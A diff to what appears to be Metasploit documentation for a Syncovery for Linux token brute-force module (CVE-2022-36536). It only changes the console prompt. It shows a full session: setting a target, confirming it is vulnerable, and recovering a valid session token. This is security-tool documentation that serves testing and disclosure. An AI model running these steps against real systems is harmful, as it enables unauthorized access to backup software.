@@ -45,10 +45,10 @@ The (TCP) target port on which Syncovery is running. By default port 8999 is use
 ### Syncovery for Linux with default credentials
 
 ```
-msf6 > use auxiliary/scanner/http/syncovery_linux_token_cve_2022_36536
-msf6 auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > set rhosts 192.168.178.26
+msf > use auxiliary/scanner/http/syncovery_linux_token_cve_2022_36536
+msf auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > set rhosts 192.168.178.26
 rhosts => 192.168.178.26
-msf6 auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > options
+msf auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > options
 
 Module options (auxiliary/scanner/http/syncovery_linux_token_cve_2022_36536):
 
@@ -63,9 +63,9 @@ Module options (auxiliary/scanner/http/syncovery_linux_token_cve_2022_36536):
    THREADS    1                yes       The number of concurrent threads (max one per host)
    VHOST                       no        HTTP server virtual host
 
-msf6 auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > check
+msf auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > check
 [+] 192.168.178.26:8999 - The target is vulnerable.
-msf6 auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > run
+msf auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > run
 
 [*] 192.168.178.26:8999 - Starting Brute-Forcer
 [+] 192.168.178.26:8999 - Valid token found: 'MDkvMDYvMjAyMiAxMzo0NDoxMg=='
